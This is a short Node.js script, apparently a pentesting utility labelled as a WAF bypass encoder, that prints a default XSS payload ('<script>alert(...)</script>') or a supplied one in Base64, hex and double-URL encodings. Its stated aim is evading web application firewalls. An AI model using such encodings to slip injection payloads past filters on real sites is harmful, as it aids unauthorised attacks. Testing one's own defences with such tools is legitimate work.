#!/usr/bin/env node

const payload = process.argv[2] || "<script>alert('BlackPanda')</script>";

const encoders = {
  "Base64": (str) => Buffer.from(str).toString('base64'),
  "Hex": (str) => Buffer.from(str).toString('hex'),
  "Double-URL": (str) => encodeURIComponent(encodeURIComponent(str)),
};

console.log(`\n🐼 BlackPanda Labs | WAF Bypass Encoder`);
console.log(`Original: ${payload}\n`);

for (const [name, func] of Object.entries(encoders)) {
  console.log(`${name}: ${func(payload)}`);
}